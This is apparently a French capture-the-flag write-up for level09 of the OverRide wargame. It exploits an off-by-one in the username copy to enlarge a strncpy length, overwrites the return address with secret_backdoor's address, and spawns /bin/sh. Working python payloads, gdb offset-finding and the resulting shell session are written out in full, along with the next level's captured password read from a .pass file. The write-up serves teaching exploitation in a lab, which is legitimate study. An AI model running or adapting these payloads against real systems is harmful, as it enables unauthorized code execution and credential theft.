#### Etape 1 : Décompilation 
```bash
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: lnaidu
>: Welcome, lnaidu
>: Msg @Unix-Dude
>>: hello  
>: Msg sent!
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
>>: >: Msg sent!
level09@OverRide:~$ 
```

Le binaire demande un username et un message a envoyé et si le buffer du username est trop grand il réecrit sur le message envoyé.

#### Etape 2 : Recherche de faille

On analyse le code grace à gdb et premierement on detecte une fonction void secret_backdoor(void) () qui execute system().

```c
  fgets(local_88,0x80,_stdin);
  system(local_88);
```
Deuxiemement nous trouvons aussi une fonction void set_username(void) qui permet de stocker le username avec une len max de 40 char.

```c
    for (i = 0; (i < 0x29 && local_98[i] != '\0'); i++); //0x29 = 41
  {
    param_1->username[i] = local_98[i];
  }
```
Troisiemement nous trouvons une fonction void set_msg(void) qui permet de stocker le avec une fonction strncpy() que l'on peut exploiter pour placer un exploit.

```c
    fgets(local_408,0x400,stdin); // 1024
    strncpy(param_1->msg,local_408,param_1->len + 0xb4);
```

#### Etape 3 : Idée

L'idée est de remplir le buffer du username avec 40 char et l'overflow afin de overflow la fonction strncpy pour placer l'exploit et acceder à secret_backdoor().

En premier nous commençons par remplir le buffer du username avec 40 char et l'overflow avec 1 char pour remplir le buffer de la fonction strncpy.
Nous remplissons ce byte avec la valeur max possible 0xff=255 pour voir si nous pouvons overflow la fonction strncpy et nous envoyons un retour pour l'envoyer.

```bash
level09@OverRide:~$ python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 500 '> /tmp/hugo 
level09@OverRide:~$ (cat /tmp/hugo -) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Segmentation fault (core dumped)
level09@OverRide:~$ 
```
Nous voyons que nous avons un segfault et que nous pouvons overflow la fonction strncpy.
Deuxiemement nous cherchons la Offset de l'adresse de retour pour ecrire l'adresse de secret_backdoor() au bon endroit.

```bash
level09@OverRide:~$ python -c 'print "A" * 40 + "\xD2" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"'> /tmp/hugo 
level09@OverRide:~$ gdb ./level09 
[...]
(gdb) run < /tmp/hugo
Starting program: /home/users/level09/level09 < /tmp/hugo
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) info register
rax            0xd      13
[...]
rsi            0x7ffff7ff7000   140737354100736
rdi            0xffffffff       4294967295
rbp            0x6741356741346741       0x6741356741346741
rsp            0x7fffffffe5d8   0x7fffffffe5d8
r8             0x7ffff7ff7004   140737354100740
[...]
(gdb) 
``` 
Nous voyons dans le rbp que notre adresse de retour est 0x6741356741346741 et grace au site https://wiremask.eu/tools/buffer-overflow-pattern-generator/? bytes=192.Nous voyons aussi que le pointeur rsp est 0x7fffffffe5d8 et que notre offset est de 192, donc comme dans un environnement 64 bits les adresses sont sur 8 bytes nous devons ajouter 192 + 8 pour obtenir l'offset de 200.

Troisiemement nous devons trouver l'adresse de secret_backdoor() pour l'ecrire à l'adresse de retour.

```bash
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```
adresse : 0x55555555488c
little endian \x8c\x48\x55\x55\x55\x55\x00\x00

et enfin nous devons placer /bin/sh dans le buffer de la fonction secret_backdoor() pour obtenir un shell.

```bash
level09@OverRide:~$ python -c 'print "A" * 40 + "\xff" + "\n" + "B" * 200 +  "\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"  + "/bin/sh"'> /tmp/hugo 
```
#### Etape 4 : Execution 

```bash
level09@OverRide:~$ python -c 'print "A" * 40 + "\xff" + "\n" + "B" * 200 +  "\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"  + "/bin/sh"'> /tmp/hugo
level09@OverRide:~$ (cat /tmp/hugo -) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
^C
Segmentation fault (core dumped)
level09@OverRide:~$ su end
Password: 
end@OverRide:~$ ls
end
end@OverRide:~$ cat end 
GG !
end@OverRide:~$ 
```

